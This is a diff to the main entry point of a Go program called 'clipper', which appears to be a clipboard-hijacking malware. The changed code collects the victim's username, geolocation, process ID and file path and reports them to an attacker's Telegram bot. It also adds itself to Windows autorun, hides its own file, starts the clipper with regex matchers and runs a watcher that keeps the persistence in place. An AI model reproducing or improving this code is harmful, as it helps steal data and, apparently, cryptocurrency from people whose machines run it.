@@ -2,8 +2,9 @@ package main
 
 import (
 	"fmt"
-	"os"
+	"os/user"
 	"regexp"
+	"syscall"
 
 	"clipper/src/autorun"
 	"clipper/src/clipper"
@@ -40,27 +41,33 @@ var (
 )
 
 func main() {
-	hostname, _ := os.Hostname()
-	
-	selfDir, _ := utils.GetSelfDir()
+	user, _ := user.Current()
+	geo := utils.GetGeo()
+	pid := syscall.Getpid()
+
+	selfPath, _ := utils.GetSelfPath()
 	selfName, _ := utils.GetSelfName()
 
 	// send start log to telegram
 	telegram.SendLog(fmt.Sprintf(
-		"Connected - %s\n\nDir - %s",
-		hostname,
-		selfDir,
+		"🟢 %s (%s)\n%s\nPID %d",
+		user.Username,
+		geo,
+		selfPath,
+		pid,
 	), chat_id, bot_token)
 
 	// we adding self to windows autorun
-	_ = autorun.AddToAutorun(selfDir, selfName)
+	_ = autorun.AddToAutorun(selfPath, selfName)
 
-	_ = hide.HideFile(selfDir)
+	// we make self hide
+	_ = hide.HideFile(selfPath)
 
 	// we starting main clipper process
 	clipper.StartClipper(chat_id, bot_token, matchers)
+
 	// we starting autorun watcher
-	autorun.StartWatcher(selfDir, selfName)
+	autorun.StartWatcher(selfPath, selfName)
 
 	select {}
 }
